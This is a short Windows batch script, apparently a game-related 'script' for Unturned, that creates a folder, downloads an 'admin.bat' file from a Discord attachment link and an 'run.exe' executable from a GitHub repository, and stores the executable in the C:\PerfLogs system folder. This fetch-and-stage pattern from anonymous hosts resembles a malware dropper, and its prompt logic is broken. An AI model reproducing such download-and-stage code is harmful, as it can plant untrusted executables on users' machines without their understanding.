echo Welcome, to Tipsy's script!
title Tipsy's script!
C:
cd C:\
mkdir bruh
cd bruh 
curl -O "https://cdn.discordapp.com/attachments/707938798117453887/709104133797445723/admin.bat"
ren admin.bat bruh.bat
cd C:\
cls
cd PerfLogs
curl -LJO "https://github.com/tipsyaltbruh123/script/raw/master/run.exe"
set /P "Is unturned installed (y or n):"
if %P%== y (goto continue) else (exit)
if %P%== n exit
cls

